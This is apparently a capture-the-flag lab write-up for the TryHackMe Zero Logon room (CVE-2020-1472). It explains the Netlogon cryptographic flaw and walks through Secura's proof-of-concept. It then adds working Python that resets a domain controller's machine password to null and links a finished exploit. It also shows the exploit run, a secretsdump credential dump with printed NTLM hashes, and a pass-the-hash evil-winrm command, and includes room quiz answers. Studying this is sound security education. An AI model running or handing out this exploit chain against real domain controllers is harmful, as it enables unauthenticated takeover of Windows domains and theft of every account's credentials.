# Zero Logon

Learn about and exploit the ZeroLogon vulnerability that allows an attacker to go from Zero to Domain Admin without any valid credentials.

[Zero Logon](https://tryhackme.com/room/zer0logon)

## Topic's

- Zero Logon

## Appendix archive

Password: `1 kn0w 1 5h0uldn'7!`

## Task 1 The Zero Day Angle

The purpose of this room is to shed light on the ZeroLogon vulnerability within an educational focus. This is done such that defenders can better understand the threat faced herein. The ZeroLogon vulnerability is approached from a "Proof of Concept" emphasis, providing a breakdown of the vulnerable method within this issue. TryHackMe does not condone illegal actions taken on the part of the individual.

**Zero Logon - The Zero Day Angle**

**About The vulnerability -**

On September 14, Secura released a whitepaper for CVE-2020-1472, that allowed an attacker to go from Zero to Domain Admin in approximately one minute. They dubbed this vulnerability Zero Logon.

Zero Logon is a purely statistics based attack that abuses a feature within MS-NRPC (Microsoft NetLogon Remote Protocol), MS-NRPC is a critical authentication component of Active Directory that handles authentication for User and Machine accounts. In short -- the attack mainly focuses on a poor implementation of Cryptography. To be more specific, Microsoft chose to use AES-CFB8 for a function called ComputeNetlogonCredential, which is normally fine, except they had hard coded the Initialization Vector to use all zeros instead of a random string. When an attacker sends a message only containing zeros with the IV of zero, there is a 1-in-256 chance that the Ciphertext will be Zero.

But how is that useful to us? We'll touch on that note in the following sections.

**About Machine Accounts -**

Normally, if we tried a statistics based attack on any user account, we would get locked out. This is not the case if we apply this principal to machine accounts. Machines accounts behave in a much different way than standard user accounts. They have no predefined account lockout attempts because a 64+ character alpha numeric password is normally used to secure them, making them very difficult to break into. They're not meant to be accessed by an end user by any means. In certain circumstances, we can dump the machine account password using a tool like Mimikatz, but if we're at that point, we've already compromised the machine -- and we're looking for persistence within the domain, not lateral movement.

**Abusing the Vulnerability -**

Machine accounts often hold system level privileges which we can use for a variety of things. If you're not familiar with Active Directory, we can take the Domain Controller's Machine Account and attempt to use the granted authentication in conjunction with Secretsdump.py (SecretsDump is a password dumping utility like Mimikatz, except it lives on the Network instead of the host) to dump all of the passwords within the domain. At this point we have a rough kill chain starting to form:

Use Zero Logon to bypass authentication on the Domain Controller's Machine Account -> Run Secretsdump.py to dump credentials -> Crack/Pass Domain Admin Hashes -> ??? -> Profit

**Analyzing the MS-NRPC Logon Process -**

At this point, we know a vulnerability exists, but we're not quite sure how to exploit it yet. We'll be covering that soon, but what we do know there's a vulnerability within the way Microsoft handles Authentication within ComputeNetLogonCredetial function of MS-NRPC. To better understand the vulnerability, we need to do a bit of a deeper dive on how Microsoft handles authentication to NRPC.

To analyze where the vulnerability occurs, we'll be using the Diagram provided by Secura as well as Microsoft Documentation to decipher the magic behind Zero Logon. The sources can be found at the bottom of this task.

![](https://zdnet4.cbsistatic.com/hub/i/r/2020/09/11/91ce3485-5a9b-4fd7-9bdb-908084954c58/resize/1200xauto/fe9d0bc8d73a637a58da4d40978ede5d/zerologon-attack.png)

Source: Secura

**Step 1**. The client creates a NetrServerReqChallenge and sends it off [Figure 1. Step 1]. This contains the following values:

1. The DC
2. The Target Device (Also the DC, in our case)
3. A Nonce (In our case is 16 Bytes of Zero).

**Step 2**. The server receives the NetrServerReqChallenge, the server will then generate it's own Nonce (This is called the Server Challenge), the server will send the Server Challenge back. [Figure 1. Step 2]

**Step 3**. The client (us) will compute it's NetLogon Credentials with the Server Challenge provided [Figure 1. Step 3]. It uses the NetrServerAuthenticate3 method which requires the following parameters:

1. A Custom Binding Handle (Impacket handles this for us, it's negotiated prior)
2. An Account Name (The Domain Controller's machine account name. ex: DC01$)
3. A Secure Channel Type (Impacket sort of handles this for us, but we still need to specify it: [nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel])
4. The Computer Name (The Domain Controller ex: DC01)
5. The Client Credential String (this will be 8 hextets of \x00 [16 Bytes of Zero])
6. Negotiation Flags (The following value observed from a Win10 client with Sign/Seal flags disabled: 0x212fffff Provided by Secura)

**Step 4**. The server will receive the NetrServerAuthenticate request and will compute the same request itself using it's known, good values. If the results are good, the server will send the required info back to the client. [Figure 1. Step 4.]

At this point the attempt to exploit the Zero Logon vulnerability is under way. The above steps above will be looped through a certain number of times to attempt to exploit the Zero Logon vulnerability. The actual exploit occurs at Step 3 and 4, this where we're hoping for the Server to a have the same computations as the client. This is where are 1-in-256 chance comes in.

**Step 5**. If the server calculates the same value, the client will re-verify and once mutual agreement is confirmed, they will agree on a session key. The session key will be used to encrypt communications between the client and the server, which means authentication is successful. [Figure 1. Step 5]

From there, normal RPC communications can occur.

Sources -

1.  Tom Tervoort of Secura - https://www.secura.com/pathtoimg.php?id=2055
1.  Microsoft - https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/7b9e31d1-670e-4fc5-ad54-9ffff50755f9
1.  Microsoft - https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/3a9ed16f-8014-45ae-80af-c0ecb06e2db9

1.  Read about Zero Logon

## Task 2 Impacket Installation

**Impacket Installation**

**Git Clone Impacket -**

As a prior warning, Impacket can be quite fussy when it comes to some modules within nrpc.py, because of this, we recommend using the TryHackMe Attack Box. This will make the exploit run faster, additionally, we can attempt to provide better support via the Attack Box. Additionally, we are going to be using a Virtual Environment to Install Impacket. The instructions to install Impacket are as follows:

```
python3 -m pip install virtualenv

python3 -m virtualenv impacketEnv

source impacketEnv/bin/activate

pip install git+https://github.com/SecureAuthCorp/impacket
```

After executing these commands, you should be placed within a Python3 Virtual Environment that will be compatible to modify the PoC to exploit Zero Logon.

Credit to Onurshin in the [TryHackMe Discord](https://discord.com/invite/tryhackme) for suggesting Python Virtual Environments.

```
kali@kali:~/CTFs/tryhackme/Zero Logon$ python3 -m pip install virtualenv
Defaulting to user installation because normal site-packages is not writeable
Collecting virtualenv
  Downloading virtualenv-20.1.0-py2.py3-none-any.whl (4.9 MB)
     |████████████████████████████████| 4.9 MB 2.6 MB/s
Collecting filelock<4,>=3.0.0
  Downloading filelock-3.0.12-py3-none-any.whl (7.6 kB)
Requirement already satisfied: six<2,>=1.9.0 in /usr/lib/python3/dist-packages (from virtualenv) (1.14.0)
Collecting distlib<1,>=0.3.1
  Downloading distlib-0.3.1-py2.py3-none-any.whl (335 kB)
     |████████████████████████████████| 335 kB 11.6 MB/s
Collecting appdirs<2,>=1.4.3
  Downloading appdirs-1.4.4-py2.py3-none-any.whl (9.6 kB)
Installing collected packages: filelock, distlib, appdirs, virtualenv
Successfully installed appdirs-1.4.4 distlib-0.3.1 filelock-3.0.12 virtualenv-20.1.0
```

```
kali@kali:~/CTFs/tryhackme/Zero Logon$ python3 -m virtualenv impacketEnv
created virtual environment CPython3.8.2.final.0-64 in 2312ms
  creator CPython3Posix(dest=/home/kali/CTFs/tryhackme/Zero Logon/impacketEnv, clear=False, global=False)
  seeder FromAppData(download=False, pip=bundle, setuptools=bundle, wheel=bundle, via=copy, app_data_dir=/home/kali/.local/share/virtualenv)
    added seed packages: pip==20.2.4, setuptools==50.3.2, wheel==0.35.1
  activators BashActivator,CShellActivator,FishActivator,PowerShellActivator,PythonActivator,XonshActivator
```

```
kali@kali:~/CTFs/tryhackme/Zero Logon$ source impacketEnv/bin/activate
(impacketEnv) kali@kali:~/CTFs/tryhackme/Zero Logon$ pip install git+https://github.com/SecureAuthCorp/impacket
Collecting git+https://github.com/SecureAuthCorp/impacket
  Cloning https://github.com/SecureAuthCorp/impacket to /tmp/pip-req-build-8uoutbyk
Collecting pyasn1>=0.2.3
  Using cached pyasn1-0.4.8-py2.py3-none-any.whl (77 kB)
Collecting pycryptodomex
  Downloading pycryptodomex-3.9.8-cp38-cp38-manylinux1_x86_64.whl (13.7 MB)
     |████████████████████████████████| 13.7 MB 10.2 MB/s
Collecting pyOpenSSL>=0.13.1
  Downloading pyOpenSSL-19.1.0-py2.py3-none-any.whl (53 kB)
     |████████████████████████████████| 53 kB 2.6 MB/s
Collecting six
  Using cached six-1.15.0-py2.py3-none-any.whl (10 kB)
Collecting ldap3!=2.5.0,!=2.5.2,!=2.6,>=2.5
  Downloading ldap3-2.8.1-py2.py3-none-any.whl (423 kB)
     |████████████████████████████████| 423 kB 11.9 MB/s
Collecting ldapdomaindump>=0.9.0
  Downloading ldapdomaindump-0.9.3-py3-none-any.whl (18 kB)
Collecting flask>=1.0
  Downloading Flask-1.1.2-py2.py3-none-any.whl (94 kB)
     |████████████████████████████████| 94 kB 2.7 MB/s
Collecting cryptography>=2.8
  Downloading cryptography-3.2.1-cp35-abi3-manylinux2010_x86_64.whl (2.6 MB)
     |████████████████████████████████| 2.6 MB 10.1 MB/s
Collecting dnspython
  Downloading dnspython-2.0.0-py3-none-any.whl (208 kB)
     |████████████████████████████████| 208 kB 5.9 MB/s
Collecting future
  Downloading future-0.18.2.tar.gz (829 kB)
     |████████████████████████████████| 829 kB 9.5 MB/s
Collecting itsdangerous>=0.24
  Downloading itsdangerous-1.1.0-py2.py3-none-any.whl (16 kB)
Collecting click>=5.1
  Using cached click-7.1.2-py2.py3-none-any.whl (82 kB)
Collecting Jinja2>=2.10.1
  Downloading Jinja2-2.11.2-py2.py3-none-any.whl (125 kB)
     |████████████████████████████████| 125 kB 11.0 MB/s
Collecting Werkzeug>=0.15
  Downloading Werkzeug-1.0.1-py2.py3-none-any.whl (298 kB)
     |████████████████████████████████| 298 kB 8.6 MB/s
Collecting cffi!=1.11.3,>=1.8
  Downloading cffi-1.14.3-cp38-cp38-manylinux1_x86_64.whl (410 kB)
     |████████████████████████████████| 410 kB 10.9 MB/s
Collecting MarkupSafe>=0.23
  Downloading MarkupSafe-1.1.1-cp38-cp38-manylinux1_x86_64.whl (32 kB)
Collecting pycparser
  Using cached pycparser-2.20-py2.py3-none-any.whl (112 kB)
Building wheels for collected packages: impacket, future
  Building wheel for impacket (setup.py) ... done
  Created wheel for impacket: filename=impacket-0.9.22.dev1+20201015.130615.81eec85a-py3-none-any.whl size=1380825 sha256=4814945cbf35d81d3e80607e2914cee9750afeb4757293fdbfcc6c3d27d4a096
  Stored in directory: /tmp/pip-ephem-wheel-cache-yfasbqvb/wheels/f2/97/f5/f481ead2e27c873c98fbbcb0074319ce69f16008f64caea6fe
  Building wheel for future (setup.py) ... done
  Created wheel for future: filename=future-0.18.2-py3-none-any.whl size=491059 sha256=f2a6c932900add817af8ec4134b22ed70d70f6166b8a109188e079e53986272b
  Stored in directory: /home/kali/.cache/pip/wheels/8e/70/28/3d6ccd6e315f65f245da085482a2e1c7d14b90b30f239e2cf4
Successfully built impacket future
Installing collected packages: pyasn1, pycryptodomex, six, pycparser, cffi, cryptography, pyOpenSSL, ldap3, dnspython, future, ldapdomaindump, itsdangerous, click, MarkupSafe, Jinja2, Werkzeug, flask, impacket
Successfully installed Jinja2-2.11.2 MarkupSafe-1.1.1 Werkzeug-1.0.1 cffi-1.14.3 click-7.1.2 cryptography-3.2.1 dnspython-2.0.0 flask-1.1.2 future-0.18.2 impacket-0.9.22.dev1+20201015.130615.81eec85a itsdangerous-1.1.0 ldap3-2.8.1 ldapdomaindump-0.9.3 pyOpenSSL-19.1.0 pyasn1-0.4.8 pycparser-2.20 pycryptodomex-3.9.8 six-1.15.0
```

```
(impacketEnv) kali@kali:~/CTFs/tryhackme/Zero Logon$
```

1. Install Impacket in a Virtual Environment

`No answer needed`

## Task 3 The Proof of Concept

**Modifying and Weaponizing the PoC**

**PoC and You -**

Poof of Concepts are incredibly important to every exploit, without them, the exploit's are almost entirely theoretical. Fortunately, Secura was able to provide a working [Proof of Concept for Zero Logon](https://github.com/SecuraBV/CVE-2020-1472) that was 90% of the way there. We simply need to make an additional call to change the password to a null value, recall Figure 3 from Task 2, Secura was even kind enough to give us the method that we need to call ([NetrServerPasswordSet2](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/14b020a8-0bcf-4af5-ab72-cc92bc6b1d81)). Looking up the method within the Microsoft Documentation, it's very similar to [hNetSeverAuthenticate3](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/3a9ed16f-8014-45ae-80af-c0ecb06e2db9), so we're going to re-use some of the same variables from that, as well as the structure.

**Analyzing the PoC -**

Before we continue any further, you should download the PoC from Secura, which can be found here:

[https://raw.githubusercontent.com/SecuraBV/CVE-2020-1472/master/zerologon_tester.py](https://raw.githubusercontent.com/SecuraBV/CVE-2020-1472/master/zerologon_tester.py)

The script may seem quite daunting at first, but it's quite simple, if you think back to Figure 1 from Task 2, you'll quickly see how it all starts to fit together. Let's start by breaking the PoC down. We're going to be this in order of execution/importance so it's easier to digest:

**Lines 3 - 13**

```py
from impacket.dcerpc.v5 import nrpc, epm
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5 import transport
from impacket import crypto

import hmac, hashlib, struct, sys, socket, time
from binascii import hexlify, unhexlify
from subprocess import check_call
MAX_ATTEMPTS = 2000
```

Lines 1-4 import the required modules from Impacket, specifically the NRPC, EPM, Crypto, and Transport libraries. Additionally, on lines 6-8 a handful of other misc libraries are also imported, however, the Impacket libraries are the star of the show here. Lastly, on line 9, we're defining a constant (similar to a variable, but never changes) that sets the maximum number of retries for Zero Logon to 2000.

**Lines 76 - 86**

```py
if __name__ == '__main__':
    if not (3 <= len(sys.argv) <= 4):
    print('Usage: zerologon_tester.py <dc-name> <dc-ip>\n')
    print('Tests whether a domain controller is vulnerable to the Zerologon attack. Does not attempt to make any changes.')
    print('Note: dc-name should be the (NetBIOS) computer name of the domain controller.')
    sys.exit(1)
    else:
    [_, dc_name, dc_ip] = sys.argv

    dc_name = dc_name.rstrip('$')
    perform_attack('\\\\' + dc_name, dc_ip, dc_name)
```

Next we skipped down to the very bottom of the script so some other variables will make sense later, Line 1 is essentially declaring a main function within Python, Line 2 we are checking for the amount of parameters, and ensuring that it's exactly 3 (zerologon_tester.py DCNAME IP). Lines 3-5 are printing the help menu only if it's greater than 3 arguments, or less than 2 and exiting. If the required arguments are supplied, on line 8 the arguments are being passed into two variables: dc_name, and dc_ip. After the arguments are passed, dc_name is being stripped of the "$" character, as the dc_name variable shouldn't have it. The user account name should however. Afterwards, it's passing the variables two variables and an additional, modified variable into a module called "perform_attack".

**Lines 57 - 73**

```py
def perform_attack(dc_handle, dc_ip, target_computer):

    print('Performing authentication attempts...')
    rpc_con = None
    for attempt in range(0, MAX_ATTEMPTS):
    rpc_con = try_zero_authenticate(dc_handle, dc_ip, target_computer)

    if rpc_con == None:
        print('=', end='', flush=True)
    else:
        break

    if rpc_con:
    print('\nSuccess! DC can be fully compromised by a Zerologon attack.')
    else:
    print('\nAttack failed. Target is probably patched.')
    sys.exit(1)
```

Line 1 is defining where the variables are being passed into for the local function, \\DCNAME is being passed into the dc_handle variable, dc_ip is being passed into dc_ip variable, and dc_name is being passed into the target_computer variable. All of which will be used later, or passed into different modules.

Line 4 sets the variable rpc_con equal to none, this will be kept track of consistently to check and see if authentication is successful, if it's not, the script will continue until 2000 retries is hit. Line 5 is where the actual retries for Zero Logon occurs in the form of a for loop. Line 6 sets the rpc_con variable to the output of a different function called "try_zero_authenticate" with a couple of variables being passed to it, specifically dc_handle, dc_ip, and target_computer. All of which we addressed earlier. The next lines are simply checking if rpc_con is equal to a invalid login attempt, if it is, print =, if not, print success, if 2000 retries is hit: print attack failed.

**Lines 20-25**

```py
def try_zero_authenticate(dc_handle, dc_ip, target_computer):

    binding = epm.hept_map(dc_ip, nrpc.MSRPC_UUID_NRPC, protocol='ncacn_ip_tcp')
    rpc_con = transport.DCERPCTransportFactory(binding).get_dce_rpc()
    rpc_con.connect()
    rpc_con.bind(nrpc.MSRPC_UUID_NRPC)
```

Line 1 is defining the try_zero_authenticate function and is taking the previously mentioned 3 variables as input, and is passing them into the function. Lines 3-6 are establishing a bind and a session with NRPC over TCP/IP so that we can communicate with the domain controller.

**Lines 27-40**

```py
plaintext = b'\x00' * 8
ciphertext = b'\x00' * 8

flags = 0x212fffff

nrpc.hNetrServerReqChallenge(rpc_con, dc_handle + '\x00', target_computer + '\x00', plaintext)
try:
server_auth = nrpc.hNetrServerAuthenticate3(rpc_con, dc_handle + '\x00', target_computer + '$\x00', nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,target_computer + '\x00', ciphertext, flags)
```

Line 1 and 2 are establishing two new variables, plaintext and ciphertext containing 16 Bytes of "\x00" which will be used to exploit the Zero Logon vulnerability. Line 4 contains a variable called Flags. These are the default flags observed from a Windows 10 Client (using AES-CFB8) with the Sign and Seal bit disabled (Source/Credit: Secura).

Line 6 is where the fun beings -- This is where Step 1 beings in Figure 1, the client creates a NetrServerReqChallenge containing the following information required by the [Microsoft Documentation](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/5ad9db9f-7441-4ce5-8c7b-7b771e243d32):

```py
NTSTATUS NetrServerReqChallenge(
    [in, unique, string] LOGONSRV_HANDLE PrimaryName,
    [in, string] wchar_t* ComputerName,
    [in] PNETLOGON_CREDENTIAL ClientChallenge,
);
```

The Primary Name being the DC Handle, the Computer Name being the Target Computer, and the Client Challenge being 16 bytes of "\x00".

And the client will receive back, which will be used in Figure 1, Step 2:

```py
NTSTATUS NetrServerReqChallenge(
    [out] PNETLOGON_CREDENTIAL ServerChallenge
);
```

Lines 8 sets up a try except (we'll see the rest of that in the next few lines), but in line 9 is where we actually attempt to exploit the Zero Logon vulnerability, this would be Figure 1, Step 3. This section requires a fair bit more information, per the Microsoft Documentation for NetrServerAuthenticate3, the following is required:

```py
NTSTATUS NetrServerAuthenticate3(
    [in, unique, string] LOGONSRV_HANDLE PrimaryName,
    [in, string] wchar_t* AccountName,
    [in] NETLOGON_SECURE_CHANNEL_TYPE SecureChannelType,
    [in, string] wchar_t* ComputerName,
    [in] PNETLOGON_CREDENTIAL ClientCredential,
    [in, out] ULONG * NegotiateFlags,
);
```

On line 9, we supply the the DC_Handle as the Primary Name, the Target Computer plus a $ as the Machine Account Name (Recall, Machine accounts do not have lockout policies), the Secure Channel Type as the Secure Channel Type previously established over RPC, the target_computer variable as the ComputerName, the Ciphertext (16 bytes of "\x00" attempting to Abuse Zero Logon, remember there's 1-in-256 chance that the Ciphertext will be the same as the plaintext), and lastly, our flags variable that mimics those of a Windows 10 client machine.

```py
NTSTATUS NetrServerAuthenticate3(
    [out] PNETLOGON_CREDENTIAL ServerCredential,
    [in, out] ULONG * NegotiateFlags,
    [out] ULONG * AccountRid
);
```

Additionally, we expect to receive two (possibly 3) things back from the Server upon (hopefully) successful exploitation of Zero Logon: The ServerCredential and AccountRid, only one of which we are going to use.

**Line 44 - 54**

```py
assert server_auth['ErrorCode'] == 0
return rpc_con

except nrpc.DCERPCSessionError as ex:

if ex.get_error_code() == 0xc0000022:
    return None
else:
    fail(f'Unexpected error code from DC: {ex.get_error_code()}.')

except BaseException as ex:
fail(f'Unexpected error: {ex}.')
```

Line 1 is retrieving the Error Code from the Server_auth variable, or the variable assigned to establish an Authentication Session with the target device. If successful, we're going to return the rpc_con variable which will inform us that we have successfully bypassed Authentication with Zero Logon. Lines 3-12 are simply Error handling lines so the program doesn't break and exit after receiving an error back.

**End of Transmission, What's Next? -**

And that's all there is to the Proof of Concept. It's not some giant, scary monster. It even successfully exploit the Zero Logon vulnerability for us -- but it stops and doesn't do anything further, so how do we proceed?

Good question, next we need to take a look at the Microsoft Documentation itself and see what we can do to interact with NRPC Itself. If you're not familiar with NRPC, and you're not that technical of an individual, look back at the last step in Task 2, Figure 3 (hint: It tells us what we need to do).

What's It All Mean, Doc? -
After going back and peaking at Figure 3 on Task 2, or researching how to reset a password over RDP, you should have came across the following document:
[https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/14b020a8-0bcf-4af5-ab72-cc92bc6b1d81](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/14b020a8-0bcf-4af5-ab72-cc92bc6b1d81)

The document outlines what information is required to change a password over NRPC. The following information is required to do so:

```py
NTSTATUS NetrServerPasswordSet2(
    [in, unique, string] LOGONSRV_HANDLE PrimaryName,
    [in, string] wchar_t* AccountName,
    [in] NETLOGON_SECURE_CHANNEL_TYPE SecureChannelType,
    [in, string] wchar_t* ComputerName,
    [in] PNETLOGON_AUTHENTICATOR Authenticator,
    [in] PNL_TRUST_PASSWORD ClearNewPassword
);
```

Going back and looking at [NetrServerAuthenticate3](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/3a9ed16f-8014-45ae-80af-c0ecb06e2db9) and [NetrServerPasswordSet2](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/14b020a8-0bcf-4af5-ab72-cc92bc6b1d81), we already have a handful of the information required, like the Primary Name, Account Name, Secure Channel Type, and the Computer Name. So we simply need two values, the Authenticator and the ClearNewPassword value. Both of these are documented from Microsoft, so lets take a look at the [Authenticator](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/76c93227-942a-4687-ab9d-9d972ffabdab) first:

```py
typedef struct _NETLOGON_AUTHENTICATOR {
    NETLOGON_CREDENTIAL Credential;
    DWORD Timestamp;
}
```

And suddenly we've hit another unknown, NETLOGON_CREDENTIAL. Fortunately, Microsoft does have documentation for NETLOGON_CREDENTIAL as well:

```py
typedef struct _NETLOGON_CREDENTIAL {
    CHAR data[8];
    } NETLOGON_CREDENTIAL,
    *PNETLOGON_CREDENTIAL;
```

Per the documentation, NETLOGON_CREDENTIAL can take 8 bytes of data, the second bullet point outlines that "the data field carries 8 bytes of encrypted data, as specified in the Netlogon Credential Computation", fortunately we know this value, thanks to Zero Logon, it's 8 bytes of Zero. In terms of the Timestamp, it's a DWORD value, so it can either be a one or a zero. Zero sounds perfectly find to me.

In order to change the password the Microsoft Documentation states that:
The Netlogon Password consists of 512 bytes of random padding (minus the length of the password, so junk+password) with the last four bytes indicting the length of the password, totaling 516 bytes.
For the simplicity of this room, we can simply supply 516 bytes of all 00 to make a null password. Eventually, we can work towards creating our own custom password, but once again, for simplicity, we're setting it to a null value now.

**Level Up -**

Now that we know the required arguments to change the password via NRPC, we actually have to implement it in Python. We need to take a look at the [nrpc.py](https://github.com/SecureAuthCorp/impacket/blob/master/impacket/dcerpc/v5/nrpc.py) module within Impacket to see the required structure for how we can craft a netrServerPasswordSet2 Request:

```py
def hNetrServerPasswordSet2(dce, primaryName, accountName, secureChannelType, computerName, authenticator, clearNewPasswordBlob):
    request = NetrServerPasswordSet2()
    request['PrimaryName'] = checkNullString(primaryName)
    request['AccountName'] = checkNullString(accountName)
    request['SecureChannelType'] = secureChannelType
    request['ComputerName'] = checkNullString(computerName)
    request['Authenticator'] = authenticator
    request['ClearNewPassword'] = clearNewPasswordBlob
    return dce.request(request)
```

As expected, most of the field nmes are the same as what Microsoft provided, except with some differences. Next, we need to know how to structure the Authenticator portion as well:

```py
class NETLOGON_AUTHENTICATOR(NDRSTRUCT):
structure = (
    ('Credential', NETLOGON_CREDENTIAL),
    ('Timestamp', DWORD),
)
```

The format here is a little bit different compared to the prior, but we'll adjust accordingly when we go to slot it into the PoC, but while we're talking about sloting it into the PoC, where will our added code go?

Our added code will go immediately before "return rpc_con" on line 45. This is where we know we have successful authentication, we want to grab that before we return to the previous function and terminate the RPC connection. Now that we know all the required information that we'll need to add to the PoC, we'll save you the painsteaking effort of writing your own code, and you can use the pre-written code below. The above explanations should help aid in understanding it.

**The Additional Code we're slotting in:**

```py
    newPassRequest = nrpc.NetrServerPasswordSet2()
    newPassRequest['PrimaryName'] = dc_handle + '\x00'
    newPassRequest['AccountName'] = target_computer + '$\x00'
    newPassRequest['SecureChannelType'] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel
    auth = nrpc.NETLOGON_AUTHENTICATOR()
    auth['Credential'] = b'\x00' * 8
    auth['Timestamp'] = 0
    newPassRequest['Authenticator'] = auth
    newPassRequest['ComputerName'] = target_computer + '\x00'
    newPassRequest['ClearNewPassword'] =  b'\x00' * 516
    rpc_con.request(newPassRequest)
```

At this point, your code should be good to go, and you should be able to successfully exploit Zero Logon. If you are still having issues, you can use the following code found here:

[https://raw.githubusercontent.com/Sq00ky/Zero-Logon-Exploit/master/zeroLogon-NullPass.py](https://raw.githubusercontent.com/Sq00ky/Zero-Logon-Exploit/master/zeroLogon-NullPass.py)

1. What method will allow us to change Passwords over NRPC?

[3.5.4.4.5 NetrServerPasswordSet2 (Opnum 30)](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/14b020a8-0bcf-4af5-ab72-cc92bc6b1d81)

`NetrServerPasswordSet2`

2. What are the required fields for the method per the Microsoft Documentation?

```py
NTSTATUS NetrServerPasswordSet2(
   [in, unique, string] LOGONSRV_HANDLE PrimaryName,
   [in, string] wchar_t* AccountName,
   [in] NETLOGON_SECURE_CHANNEL_TYPE SecureChannelType,
   [in, string] wchar_t* ComputerName,
   [in] PNETLOGON_AUTHENTICATOR Authenticator,
   [out] PNETLOGON_AUTHENTICATOR ReturnAuthenticator,
   [in] PNL_TRUST_PASSWORD ClearNewPassword
 );
```

`PrimaryName,AccountName,SecureChannelType,ComputerName,Authenticator,ReturnAuthenticator,ClearNewPassword`

3. What Opnumber is the Method?

`30`

4. Modify the PoC

`No answer needed`

## Task 4 Lab It Up!

**Lab It Up**

**Time to Play -**

Now that you've learned about Zero Logon, it's time to put your new found skills to the test and exploit this vulnerable Domain Controller!

**Ctrl+Z -**

After you get done, if you want to play around some more, instead of terminating the machine, you can simply issue the following command to reset the machine back to it's original state:

```ps1
powershell.exe -c 'Reset-ComputerMachinePassword'
```

If you're confused on how to issue the command, you can simply Pass The Local Admin Hash with Evil-WinRM to gain command execution. You can do so with the following command:

```
evil-winrm -u Administrator -H <Local Admin Hash> -i <Machine IP>
```

```
(impacketEnv) kali@kali:~/CTFs/tryhackme/Zero Logon$ nmap -sV -sC 10.10.162.183
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-30 15:22 CET
Nmap scan report for 10.10.162.183
Host is up (0.040s latency).
Not shown: 987 closed ports
PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
| fingerprint-strings:
|   DNSVersionBindReqTCP:
|     version
|_    bind
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Holo.Live
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-10-30 14:22:17Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hololive.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: hololive.local0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: HOLOLIVE
|   NetBIOS_Domain_Name: HOLOLIVE
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: hololive.local
|   DNS_Computer_Name: DC01.hololive.local
|   Product_Version: 10.0.17763
|_  System_Time: 2020-10-30T14:24:34+00:00
| ssl-cert: Subject: commonName=DC01.hololive.local
| Not valid before: 2020-09-19T17:58:40
|_Not valid after:  2021-03-21T17:58:40
|_ssl-date: 2020-10-30T14:24:49+00:00; +1s from scanner time.
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=10/30%Time=5F9C219D%P=x86_64-pc-linux-gnu%r(DNS
SF:VersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version
SF:\x04bind\0\0\x10\0\x03");
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   2.02:
|_    Message signing enabled and required
| smb2-time:
|   date: 2020-10-30T14:24:37
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 282.92 seconds
```

1. What is the NetBIOS name of the Domain Controller?

`DC01`

2. What is the NetBIOS domain name of the network?

`HOLOLIVE`

3. What domain are you attacking?

`hololive.local`

4. What is the Local Administrator's NTLM hash?

```
(impacketEnv) kali@kali:~/CTFs/tryhackme/Zero Logon$ python3 zeroLogon-NullPass.py DC01 10.10.162.183

 _____                   __
/ _  / ___ _ __ ___     / /  ___   __ _  ___  _ __
\// / / _ \ '__/ _ \   / /  / _ \ / _` |/ _ \| '_ \
 / //\  __/ | | (_) | / /__| (_) | (_| | (_) | | | |
/____/\___|_|  \___/  \____/\___/ \__, |\___/|_| |_|
                                  |___/
                Vulnerability Discovered by Tom Tervoort
                              Exploit by Ronnie Bartwitz

Performing authentication attempts...
Failure to Autheticate at attempt number: 148
Zero Logon successfully exploited, changing password.
```

```
(impacketEnv) kali@kali:~/CTFs/tryhackme/ZeroLogon$ ./impacketEnv/bin/secretsdump.py -just-dc -no-pass DC01\$@10.10.162.183
Impacket v0.9.22.dev1+20201015.130615.81eec85a - Copyright 2020 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3f3ef89114fb063e3d7fc23c20f65568:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:2179ebfa86eb0e3cbab2bd58f2c946f5:::
